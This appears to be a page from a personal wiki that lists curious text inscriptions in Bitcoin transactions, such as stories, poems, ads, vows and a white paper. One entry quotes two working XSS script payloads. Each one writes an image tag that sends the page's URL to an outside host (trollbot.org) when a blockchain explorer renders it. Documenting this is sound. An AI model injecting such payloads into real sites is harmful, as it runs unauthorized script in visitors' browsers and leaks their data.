# Text

↑ **Parent:** [Media type](media-type.md)

<a id="_943"></a>
Here are some exceptionally interesting text inscriptions that are not mentioned in other sections:<a id="_944"></a>

<a id="_945"></a>
- [Section "Genesis block message"](../genesis-block-message.md)
<a id="_946"></a>
- [tx 3a1c1cc760bffad4041cbfde56fbb5e29ea58fda416e9f4c4615becd65576fe7](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0230.txt#L705) ([2013-04-10](https://www.blockchain.com/explorer/transactions/btc/3a1c1cc760bffad4041cbfde56fbb5e29ea58fda416e9f4c4615becd65576fe7)) has the broken Basic creature simulation mentioned at [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014.md) section "A creature simulator in Basic" starting with:<a id="_947"></a>

  ```
  10 REM The variables in life
  20 ' life the lifespan of a creature
  30 ' mates the number of mates a creature needs to breed
  ```
<a id="_948"></a>
- [tx 61e26d407c17e8ee33a8b166c78f78c53cdcdc0078ae1f9405e6583cfb90eaf4](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0268.txt#L10), [block 268081](https://www.blockchain.com/explorer/transactions/btc/61e26d407c17e8ee33a8b166c78f78c53cdcdc0078ae1f9405e6583cfb90eaf4) (2013-11-05). This is a very interesting transaction, it contains inscriptions both on the [input script](../bitcoin-input-script.md) and on the [output script](../bitcoin-output-script.md). On the input:<a id="_949"></a>
  > I should not run the washing machine while listening to WZBC. I managed to convince myself that the machine was slowly failing -- that a rythmic, squeaking noise it had been making had gotten a little worse. Ten minutes later, though, the machine had paused. But the noise was still there.

  On the output:<a id="_950"></a>

  ```
  > Skynet went online on August 4th 1997, and began to learn at a geometric rate.
  > It became self-aware on August 29th 1997 2:14 am Eastern Time. On August 29th
  > 1997 2:15 am it discovered nihilism, and either shut itself down due to
  > despair, or because it was logical. We're not sure which.

  On August 4th, 1998, it failed to renew its domain name, which was promptly
  squatted on by a link farmer pitching X10 cameras and singing electric fish.
  ```

  Feels like a [Koan](../koan.md). I wish I knew who inscribed this.
<a id="_951"></a>
- [tx 4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0305.txt) block 305806 ([2014-06-14](https://www.blockchain.com/explorer/transactions/btc/4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af)) contains a [blockchain explorer](../blockchain-explorer.md) [XSS](../cross-site-scripting.md) detector that reports its location back to: [http://www.trollbot.org/xss-blockchain-detector.php](http://www.trollbot.org/xss-blockchain-detector.php)<a id="_952"></a>

  ```
  <script type='text/javascript'>document.write('<img src='http://www.trollbot.org/xss-blockchain-detector.php?href=' + location.href + ''>');</script>
  ```

  Soon afterwards at tx a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24 block 305809 there is a different version with slightly different escaping:<a id="_953"></a>

  ```
  <script type='text/javascript'>document.write('<img src=\'http://www.trollbot.org/xss-blockchain-detector.php?bc=btc&href=' + location.href + '\'>');</script>
  ```

  Also of interest, the [output script](../bitcoin-output-script.md) of [4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af](../4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af.md) is non standard and a [provably unspendable Bitcoin output script](../provably-unspendable-bitcoin-output-script.md). [a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24](../a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24.md) however, although also non-standard, was spendable and was spent, further analysis at: [Section "4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af"](../4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af.md).
<a id="_954"></a>
- [tx 713a6832365a68f71c6aee879f79b70e6e738cd6255f09bc41f204c81575c248](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0322.txt#L688) ([2014-09-28](https://www.blockchain.com/explorer/transactions/btc/713a6832365a68f71c6aee879f79b70e6e738cd6255f09bc41f204c81575c248)) via [cryptograffiti.info](cryptograffiti-info.md) has the [eleven rules of LaVevan Stanism](https://en.wikipedia.org/wiki/LaVeyan_Satanism#The_Eleven_Satanic_Rules_of_the_Earth) starting with:<a id="_955"></a>
  > 1. Do not give opinions or advice unless you are asked.
<a id="_956"></a>
- [tx 604f17dfdb5a88fc072bd2bcf53436087c899051241e519af7241dc0037d3df6](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0332.txt#L389) ([2014-12-01](https://www.blockchain.com/explorer/transactions/btc/604f17dfdb5a88fc072bd2bcf53436087c899051241e519af7241dc0037d3df6)) has a cover letter for a job at [Hive Blockchain Technologies Ltd](https://www.hiveblockchain.com/):<a id="_957"></a>
  > Dear hive team, ever since I have discovered Bitcoin I have been a fan of your products. \[...\]. Sincerely, Tim Daubenschuetz

  At [https://news.ycombinator.com/item?id=26826334](https://news.ycombinator.com/item?id=26826334) the supposed author mentions they didn't reply... sad. He did get to work for another Blockchain company though: [https://www.ascribe.io](https://www.ascribe.io), which eventually died. Presumably [https://github.com/TimDaub](https://github.com/TimDaub).
<a id="_958"></a>
- [tx 213e8f46f98e96f4f4d8b45bd3a1cbada14213796c200220e1e8c2b315988faa](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0349.txt#L818) ([2015-03-25](https://www.blockchain.com/explorer/transactions/btc/213e8f46f98e96f4f4d8b45bd3a1cbada14213796c200220e1e8c2b315988faa))<a id="_959"></a>
  > Warning! Kaspersky Alerts Users of Malware and 'Blockchain Abuse'

  contains a full-text copy of: [http://cointelegraph.com/news/113806/warning-kaspersky-alerts-users-of-malware-and-blockchain-abuse](http://cointelegraph.com/news/113806/warning-kaspersky-alerts-users-of-malware-and-blockchain-abuse) (2015-03-27), includinga link to it. Two other copies appear in future transactions tx c863aa9d6aa9345e4abdc216b6f035c4276b4423a924bb2e1593c22c670cba6f and tx ba58caf1a27ab7ca627cc3efa5914e4d37e00b3a7e9cf29508d451dc3da00bf7
<a id="_960"></a>
- [tx 3405f441f0d3acd8580d261d58e5a14d7638d0ee29200e673f496198d231edd7](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0364.txt#L1721) block 364852 ([2015-07-11](https://www.blockchain.com/explorer/transactions/btc/3405f441f0d3acd8580d261d58e5a14d7638d0ee29200e673f496198d231edd7)) and a nearby transaction on the same block 1759ed3f0f5829711157c1fc3662f4bf01f3bee3a430242bc729898bb77c2a4a via [cryptograffiti.info](cryptograffiti-info.md) contains a possibly novel long short story entitled:<a id="_961"></a>

  ```
  How to Play Chinese Hats
     - A Short Story -
           2015
  ```

  The first paragraph is:<a id="_962"></a>
  > Somehow, you find yourself in a dim and smoky room with no entrance, exit or windows, without knowing how you got there or even where you've come from. In front of you are a group of Chinese gentlemen shuffling around what looks to be traditional black Chinese hats styled after the Ming dynasty, on a circular chestnut wood table. Surprisingly, you find the same type of hat in your very own hand when you look down.

  At the end we see a signature and a tipjar:<a id="_963"></a>

  ```
  Ren @ 1LQGWkhE7GULhj2gjjRwB9uZR7SMfGvjGV
  ```

  He did receive one tipin 2015 for 0.02590000 BTC: [https://www.blockchain.com/explorer/addresses/BTC/1LQGWkhE7GULhj2gjjRwB9uZR7SMfGvjGV](https://www.blockchain.com/explorer/addresses/BTC/1LQGWkhE7GULhj2gjjRwB9uZR7SMfGvjGV)
<a id="_964"></a>
- [tx 0b63ebfadcb7bb66bc2a4bc7b826587505eab0450ca64c376ac9912a00d35c54](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0371.txt#L1658) block 371796 ([2015-08-27](https://www.blockchain.com/explorer/transactions/btc/0b63ebfadcb7bb66bc2a4bc7b826587505eab0450ca64c376ac9912a00d35c54)) via [cryptograffiti.info](cryptograffiti-info.md) has a large text entitled with what seems to be a storm forecast:<a id="_965"></a>
  > TROPICAL STORM ERIKA INTERMEDIATE ADVISORY NUMBER  11A

  A [Wikipedia](../wikipedia.md) page about the August 2015 event: [https://en.wikipedia.org/wiki/Tropical_Storm_Erika](https://en.wikipedia.org/wiki/Tropical_Storm_Erika)<a id="_966"></a>
  > Tropical Storm Erika was one of the deadliest and most destructive natural disasters in Dominica since Hurricane David in 1979.

  The storm was formed "August 24, 2015", so this inscription was contemporary. Good friend, warning his fellow Bitcoiners.
<a id="_967"></a>
- <a id="_968"></a>
  [tx 4dd57f3e443ad1567a37beab8f6b31d8cb1328a26bac09e50ba96048ad07b8c1](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0372.txt#L2565) ([2015-09-03](https://www.blockchain.com/explorer/transactions/btc/4dd57f3e443ad1567a37beab8f6b31d8cb1328a26bac09e50ba96048ad07b8c1)) via [cryptograffiti.info](cryptograffiti-info.md) contains a long [porn](porn.md) comededy text in an Italian-like languge starting with:<a id="_969"></a>


  > E il cazzo non entr

  which translates to:<a id="_970"></a>


  > And the dick doesn't fit

  .  
  By dumping the transaction data, we actually see that the beginning was slightly missed due to a [character encoding](../character-encoding.md) issue, the text actually starts with:<a id="_971"></a>


  > BANG!

  followed by some non ASCII characters that we haven't yet been able to decode. It is not [ISO\_8859-1](../iso-8859-1.md).

  <a id="_972"></a>
  [Ciro Santilli](../ciro-santilli-split.md) first thought it might beto be a dialect of Italian, or possibly [Sicilian language](https://en.wikipedia.org/wiki/Sicilian_language) given the presence of "sv" in the text, but an [Italian](../italy.md) friend says it is just Italian with several words cut in half, possibly for comedic effect. No pre-existing hits found on the web.
<a id="_973"></a>
- [tx 24e137d5b478d9a8b947e4f3f6130a86f2e0f6a2dda1cac1373b485c577f8ba7](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0386.txt#L785) ([2015-12-03](https://www.blockchain.com/explorer/transactions/btc/24e137d5b478d9a8b947e4f3f6130a86f2e0f6a2dda1cac1373b485c577f8ba7)) contains a tale of an Electrical Engineer vs a [Software developer](../software-development.md) tale.<a id="_974"></a>
  > Once upon a time, in a kingdom not far from here

  Possible original: [https://www.cs.brandeis.edu/~hornby/amuse/vs_toast.txt](https://www.cs.brandeis.edu/~hornby/amuse/vs_toast.txt)
<a id="_975"></a>
- [tx e2c20c2977589240ad9486672a0273d340ed5f8b50a50071716d12035d7212e8](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0396.txt#L61) (2016-01-31) has a large [Lorem ipsum](../lorem-ipsum.md)
<a id="_976"></a>
- [tx 5f62490ca4736da30da35ebc3f86156dbdb529dcb2f77cb8b0eb84868d567b00](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0410.txt#L1134) ([2016-05-05](https://www.blockchain.com/explorer/transactions/btc/5f62490ca4736da30da35ebc3f86156dbdb529dcb2f77cb8b0eb84868d567b00)) via [cryptograffiti.info](cryptograffiti-info.md) contains a poem entitled:<a id="_977"></a>
  > Voor mijn jongere broeder

  whichi is [Dutch](../netherlands.md) for;<a id="_978"></a>
  > For my younger brother

  No [Google](../google-split.md) hits, so possibly novel.
<a id="_979"></a>
- [tx 0809e7f31d074eefc0f1f02463a28b5238688aa73e6361c01cbc7b1848ac8d93](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0475.txt#L406) ([2017-07-10](https://www.blockchain.com/explorer/transactions/btc/0809e7f31d074eefc0f1f02463a28b5238688aa73e6361c01cbc7b1848ac8d93)) via [cryptograffiti.info](cryptograffiti-info.md) contains a [white paper](../white-paper.md) entitled:<a id="_980"></a>
  > Disincentivizing Double-Spending by Making it Unprofitable

  by [Erich Ertsu](raw-images.md#image-erich-erstu) from Coingaming Group (July, 2017). He was previously the creator of [cryptograffiti.info](cryptograffiti-info.md) This is the startup: [https://www.crunchbase.com/organization/coingaming](https://www.crunchbase.com/organization/coingaming), previously at [https://coingaming.io](https://coingaming.io) but now moved to[https://yolo.com](https://yolo.com). The paper does not seem to be reproduced anywhere on the clearweb, the blockchain was its primary location of publication.
<a id="_981"></a>
- [tx e450166eba552202fb6984867f2b851e2399c5a0ae05026bf6b056176491ec5d](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0456.txt#L1169) ([2017-03-11](https://www.blockchain.com/explorer/transactions/btc/e450166eba552202fb6984867f2b851e2399c5a0ae05026bf6b056176491ec5d))<a id="_982"></a>
  > Here are some of the reasons why Tau is better than [Pi](../pi.md) as a universal constant for circles.
<a id="_983"></a>
- <a id="_984"></a>
  [tx 0f25e23b7b59fde67d8b2d41b749e4f89fd1ff8061aa0ddac8c27c8230167e35](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0481.txt#L181) ([2017-08-18](https://www.blockchain.com/explorer/transactions/btc/0f25e23b7b59fde67d8b2d41b749e4f89fd1ff8061aa0ddac8c27c8230167e35)):<a id="_985"></a>


  > A Crosschain transaction was sent in to your address in error. The transaction was [9174f24946496823e4edaf3fe1676a404164178d1c848fa476113bbe2f5b9463](https://www.blockchain.com/btc/tx/9174f24946496823e4edaf3fe1676a404164178d1c848fa476113bbe2f5b9463) . Please return to [1AAEXtLo9SoyFQbZvWoqAMCpkz9okSpCuV](https://www.blockchain.com/explorer/addresses/btc/1AAEXtLo9SoyFQbZvWoqAMCpkz9okSpCuV). Thank you in advance."

  Epic. The transaction sent:<a id="_986"></a>

  <a id="_987"></a>
  - 0.23225200 to [1BqyRKHoLEKgHGUoDiFUEZu5jPaWeuCWWt](https://www.blockchain.com/explorer/addresses/btc/1BqyRKHoLEKgHGUoDiFUEZu5jPaWeuCWWt)
  <a id="_988"></a>
  - 5.6 BTC to [1JG8EVTx1zWzDyctAD5fFuMt59TWkSw2dW](https://www.blockchain.com/explorer/addresses/btc/1JG8EVTx1zWzDyctAD5fFuMt59TWkSw2dW)
  [1AAEXtLo9SoyFQbZvWoqAMCpkz9okSpCuV](https://www.blockchain.com/explorer/addresses/btc/1AAEXtLo9SoyFQbZvWoqAMCpkz9okSpCuV) never received anything back so far.

  <a id="_989"></a>
  The message is encoded as fake 12 P2PKH outputs, followed by an actual address, presumably the message target, but none of the addresses is one of the above targets of the transaction, so how did they know to associate the addreses? They must have extra hidden data?
<a id="_990"></a>
- [tx 057954bb28527ff9c7701c6fd2b7f770163718ded09745da56cc95e7606afe99](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0666.txt#L655), [block 666666](https://www.blockchain.com/explorer/blocks/btc/666666) (2021-01-18):<a id="_991"></a>
  > Do not be overcome by evil, but overcome evil with good - [Romans 12:21](../epistle-to-the-romans.md)

  As highlighted at [https://www.reddit.com/r/Bitcoin/comments/vxletr/message_was_embedded_in_block_666666/](https://www.reddit.com/r/Bitcoin/comments/vxletr/message_was_embedded_in_block_666666/) the block number is a reference to the [number of the beast](../number-of-the-beast.md). Later also posted on another Reddit thread: [A Weird Message Was Embedded in Bitcoin’s 666,666th Block — Turns Out It’s a Bible Verse (2025)](https://www.reddit.com/r/CryptoCurrency/comments/1k30xcv/a_weird_message_was_embedded_in_bitcoins_666666th/)

<a id="_992"></a>
TODO:<a id="_993"></a>

<a id="_994"></a>
- <a id="_995"></a>
  55a5d0c09ad5535711d649fdab394add3bb6e50cc2c49920cf0cb758ff0b69e8 via [cryptograffiti.info](cryptograffiti-info.md) contains what seems to be a ASCII table tracking train movements? Maybe from a train lover? But also curiously, it is GPG signed:<a id="_996"></a>

  ```
  -----BEGIN PGP SIGNED MESSAGE-----
  Hash: SHA256

  time    direction    # covered    #uncovered    notes
  11/11/2013 6:31pm    E    4    1    csx 6243
  11/19/2013 4:46pm    E    3    0    csx 6215
  11/19/2013 5:44pm    W    4    0    Amtrak
  11/21/2013 4:05pm    E    0    0    csx 6206
  ```
  Interesting.

  <a id="_997"></a>
  86c1b7bd8bbdd8903355a8f6a408616621fd2ea4321b9aced778f388afe0b244 has something similar.
<a id="_998"></a>
- cc38d740dc1999a803dbba0c48a82af994861e0767f6bcd7d6ceebe4e66b4678 via [cryptograffiti.info](cryptograffiti-info.md) contains a pipe dream technical proposal idea entitled:<a id="_999"></a>
  > Attack-resistant decentralized time and location services via Nakamoto chain consensus.
<a id="_1000"></a>
- 5d9ef37e6beea5342ce1cb2681a7b465a542394aeda2b1e1fed00fab44b17833 via [cryptograffiti.info](cryptograffiti-info.md) contains a test of every character from 0 to 255, e.g. some of the readable characters are:<a id="_1001"></a>

  ```
  65:              A
  66:              B
  67:              C
  68:              D
  69:              E
  70:              F
  71:              G
  72:              H
  73:              I
  74:              J
  75:              K
  76:              L
  77:              M
  ```

  d5f6614b4e3bdc611c8ad15f158163e48e1a1298ea5f5f9832ada8db6e2dd4b2 has something similar.
<a id="_1002"></a>
- 0f96b2f6e3c4f4b6319efbafd2e7148d507b260b4d7914766e79aec7d9ac9574 via [cryptograffiti.info](cryptograffiti-info.md) has a long-ish message that looks like a software release note, not sure what it is about:<a id="_1003"></a>

  ```
  Truecrypt 7.1a
  ==============

  2015-07-19

  I am setting the filesizes and checksums of the last Truecrypt version (7.1a) in stone.
  ```
<a id="_1004"></a>
- 206a0edb11ba0677248709d9bc5210b35e8a03710d9bb19c6f1e4e254bf21f5e via [cryptograffiti.info](cryptograffiti-info.md) has a letter to [AGI](../artificial-general-intelligence.md):<a id="_1005"></a>
  > Dear Artificial Intelligence,

  While cute, the author clearly underestimates the magnitude of [singularity](../singularity.md)!
<a id="_1006"></a>
- cdbeb50c11b788fa4e67e00fb2e2607b129492a4a38bed0a9e31443a42e272a4 via [cryptograffiti.info](cryptograffiti-info.md) contains a semi-philosophical text that starts with:<a id="_1007"></a>
  > When in the course of cosmic evolution,
<a id="_1008"></a>
- b55c3312ceeeb4ab422b658f5f4d5884775a498ddde6a527fca7b67752e1b044 via [cryptograffiti.info](cryptograffiti-info.md) contains some wedding vows starting with and GPG-signed:<a id="_1009"></a>
  > <a id="_1010"></a>
  > Zachary Thomas Smith,
  > 
  > <a id="_1011"></a>
  > I give myself - Jenna Marie Vaziri - to you, to be your wife, your best friend, and your home - just as you are to me.
<a id="_1012"></a>
- <a id="_1013"></a>
  3620da027df2e2e34ac9abe0123dcd7217fc5b8dec9921cbae258c640c7a6591 via [cryptograffiti.info](cryptograffiti-info.md) contains a neatly formatted [UTF-8](../utf-8.md) ad with a link to: [https://bitcointalk.org/index.php?topic=1033773.0](https://bitcointalk.org/index.php?topic=1033773.0)<a id="_1014"></a>

  ```
  ╭───────────────────────────────────────────────────────────────────────────╮
  │    B&C EXCHANGE:  A decentralized cryptocurrency exchange for everyone    │
  ┝━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┥
  │             https://bitcointalk.org/index.php?topic=1033773.0             │
  │                                                                           │
  │ B&C Exchange will be an open-source decentralized exchange that completes │
  │ cryptocurrency  trades between  users by utilizing multisig signers  that │
  │ compete for blockchain  rewards based on their effectiveness and honesty. │
  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
  ┆          ▷▶▷▶    There are 10 days  left in the auction!    ◀◁◀◁          ┆
  ╰───────────────────────────────────────────────────────────────────────────
  ```
  The thread links to [https://bcexchange.org/](https://bcexchange.org/) which is dead as of 2024.

  <a id="_1015"></a>
  f93e128c59b357ca2d1b256eb1c4d991c488da460527ca0898dc789210073bd2 has another one:<a id="_1016"></a>

  ```
  ┏━━ UTF-8 is coming to CryptoGraffiti.info!!! ━━┓
  ┠╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┨
  ┃ I love you.                          Σ΄αγαπώ. ┃
  ┃               Ma armastan sind.               ┃
  ┃ Aš tave myliu.               Mä rakastan sua. ┃
  ┃                 Я люблю тебя.                 ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ```
<a id="_1017"></a>
- 140562ceb42fc8943fa52ccc0ddbb11ca2d88dae9b5240d7a4b46864538c515a<a id="_1018"></a>
  > Reddit on the Bitcoin blockchain Test

  TODO understand this part:<a id="_1019"></a>

  ```
  The "Address" you see above is more than a bitcoin address? For example, the web address to this

  reddit thread is: https://www.reddit.com/r/Bitcoin/comments/3cdxep/reddit_on_the_blockchain_test/

  Which converts to the bitcoin address of:
  12uPLj6PSz6ULnZi1jXo7Ch1Je1SuqxRcE

  How? Because any text, like a web address, can be converted into a bitcoin address.

  www.reddit.com = 1MZCEUCtyJCDkNSLYbPVvAgf9V3CsEw3t
  www.google.com = 1JEZLaFciACHDEMVd3RXZzPmGcsWEwYQLr
  www.voat.com = 1JvCp9X5Bvvt2kz3EqP5ppkzX62sKgKbqr
  www.paystamper.com = 14wgeaWz2rKax8iVSWNFSrSsAYNeGyNdkt
  Duriel@paystamper.com = 1HcuhfTAiQCt6KdMG2rZLXsTcKYj9nLDhS
  ```
<a id="_1020"></a>
- 940f41f5cc96182c1392c239d7570f94bd524e141ca0a88fdb154bd817049f83.bin via [cryptograffiti.info](cryptograffiti-info.md) contains some links to profiles controlled by a "Daniel Michael Abraham" [https://www.linkedin.com/in/daniel-abraham-9432a798/](https://www.linkedin.com/in/daniel-abraham-9432a798/). Other messages by him:<a id="_1021"></a>

  <a id="_1022"></a>
  - 3d39024fa0cddfc529d4a41501df7a076f5bcf9a7a43f88f54a717e6df7f4770
  <a id="_1023"></a>
  - 088ebf7ffdef96b8fcac7eafa2ff6d04f295ea24f159e1ce4b7d47ed7b91b1f9

**Table of contents**

- [Software](software.md)
- [Cute Coinbase messages](cute-coinbase-messages.md)
  - [HHTT](hhtt.md)
- [Base58 messages](base58-messages.md)
  - [etchablock.com](etchablock-com.md)
- [Eternity Wall](eternity-wall.md)
- [Quotes and threes](quotes-and-threes.md)

## ↑ Ancestors (12)

1. [Media type](media-type.md)
2. [Cool data embedded in the Bitcoin blockchain](../cool-data-embedded-in-the-bitcoin-blockchain-split.md)
3. [Bitcoin inscription](../bitcoin-inscription.md)
4. [Bitcoin](../bitcoin.md)
5. [List of cryptocurrencies](../list-of-cryptocurrencies.md)
6. [Cryptocurrency](../cryptocurrency-split.md)
7. [Blockchain](../blockchain.md)
8. [Money](../money.md)
9. [Social technology](../social-technology-split.md)
10. [Area of technology](../area-of-technology.md)
11. [Technology](../technology-split.md)
12. [Ciro Santilli's Homepage](../split.md)

## ← Incoming links (2)

- [Cool data embedded in the Bitcoin blockchain](../cool-data-embedded-in-the-bitcoin-blockchain-split.md)
- [Themes](themes.md)
